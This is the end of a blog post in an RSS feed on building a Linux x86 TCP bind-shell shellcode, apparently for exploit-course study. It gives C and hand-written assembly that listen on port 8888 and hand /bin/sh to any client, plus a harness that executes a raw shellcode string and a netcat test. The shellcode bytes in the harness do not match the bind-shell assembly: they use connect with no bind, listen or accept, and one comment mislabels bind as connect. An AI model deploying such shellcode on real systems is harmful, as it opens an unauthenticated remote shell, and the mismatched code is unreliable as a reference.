     server.sin_family = AF_INET;
     server.sin_port = htons( 8888 );
 
     sock = socket(AF_INET , SOCK_STREAM , 0);
     //int bind(int socket, struct sockaddr *localAddress, unsigned int addressLength) 
     bind(sock, (struct sockaddr *)&amp;amp;server, sizeof(server));
 
     //int listen(int socket, int queueLimit)
     listen(sock, 0);
 
     //int accept(int socket, struct sockaddr *clientAddress, unsigned int *addressLength)
     clntSock = accept(sock, NULL, NULL);
 
     dup2(clntSock, 0);
     dup2(clntSock, 1);
     dup2(clntSock, 2);
 
     execve(&quot;/bin/sh&quot;, 0, 0);
 
     return 0;
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;handcrafted-shellcode&quot;&gt;Handcrafted shellcode&lt;/h2&gt;

&lt;p&gt;Once again, my idea here is not to generate a small shellcode, but a comprehensible one. It was pretty simple to modify the reverse shell code to this one, given the only significant changes are those related to the new syscalls.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text
_start:

;###socket###
;socket(AF_INET , SOCK_STREAM , 0);

xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx

;push the list of arguments onto the stack
push ebx ;PROT
push 0x01 ;SOCK_STREAM
push 0x02 ;AF_INET

mov bl, 0x01 ;socket function

mov ecx, esp ;pass the pointer to the list of arguments to ecx

int 0x80
mov edi, eax ; save socket fd into edi (eax may change!)

;###bind###

;struct sockaddr_in {
;	unsigned short  sin_family;     /*  Internet protocol (AF_INET) */
;	unsigned short  sin_port;       /* Address port (16 bits) */
;	struct in_addr sin_addr;        /*  Internet address (32 bits) */
;	char sin_zero[8];               /* Not used */
;};
;
;struct in_addr {
;	unsigned long s_addr;  // load with inet_aton()
;};
push 0x0101017f 
push word 0xb822 ; sin_port=8888 
push word 0x02

mov esi, esp ;save the pointer to the struct in esi

;bind syscall
;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength)
xor eax, eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x02 ;bind

push 0x10 ;addressLength=16bytes. short+short+8+long=2+2+8+4=16
push esi ;address of the struct 
push edi ;socket fd

mov ecx, esp ;pass the pointer to the list of arguments to ecx
int 0x80

;###listen###
xor eax, eax
push eax
mov al, 0x66 ;socketcall
xor ebx, ebx
mov bl, 0x04 ;listen function
push edi

mov ecx, esp
int 0x80

;###accept###
xor eax, eax
xor ebx, ebx
xor ecx, ecx
push eax ;NULL
push eax ;NULL
push edi

mov al, 0x66 ;socketcall
mov bl, 0x05 ;accept function

mov ecx, esp
int 0x80

mov esi, eax ;save the client socket fd into esi

;###copy file descriptors###
;dup2(clntSock, 0);
;dup2(clntSock, 1);
;dup2(clntSock, 2);

push byte 0x3f ;dup2
pop eax
mov ebx, esi
xor ecx, ecx

int 0x80

push byte 0x3f
pop eax
inc ecx

int 0x80

push byte 0x3f
pop eax
inc ecx

int 0x80

;###execve###
xor eax, eax
mov al, 0x0b ;sys_execve
xor ebx, ebx 
push ebx ;terminate string with \0
push 0x68732f2f ;String &quot;hs//&quot;
push 0x6e69622f;String &quot;nib/&quot;
mov ebx, esp

xor ecx, ecx
xor edx, edx

int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;testing&quot;&gt;Testing&lt;/h2&gt;
&lt;p&gt;Using the &lt;a href=&quot;https://marcosvalle.github.io/osce/2018/05/03/testing-shellcode.html&quot;&gt;test skelleton code&lt;/a&gt; slightly modified so the port and the IP address are configurable:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

/*
 ipaddr 127.1.1.1 (0101017f)
 port 8888 (b822)
*/
#define IPADDR &quot;\x7f\x01\x01\x01&quot;
#define PORT &quot;\x22\xb8&quot;

unsigned char *shellcode =&quot;\x6a\x66\x58\x31\xdb\x53\x43\x53\x43\x53\x4b\x89\xe1\xcd\x80\x89\xc7\x68&quot;IPADDR&quot;\x66\x68&quot;PORT&quot;\x66\x6a\x02\x89\xe6\x6a\x66\x58\x6a\x03\x5b\x6a\x10\x56\x57\x89\xe1\xcd\x80\x6a\x3f\x58\x89\xfb\x31\xc9\xcd\x80\x6a\x3f\x58\x6a\x01\x59\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x0b\x58\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80&quot;;

 
 int main(){
     int (*ret)();
     ret = (int(*)())shellcode;
     ret();
 
     return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Compiling it with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ gcc -m32 test.c -o test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now running it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And connecting from another terminal:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc 127.1.1.1 8888
whoami 
valle
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
				<pubDate>Sun, 02 Sep 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/09/02/bind-shell-tcp.html</link>
				<guid isPermaLink="true">/re/exploit/2018/09/02/bind-shell-tcp.html</guid>
			</item>
		
	</channel>
</rss>
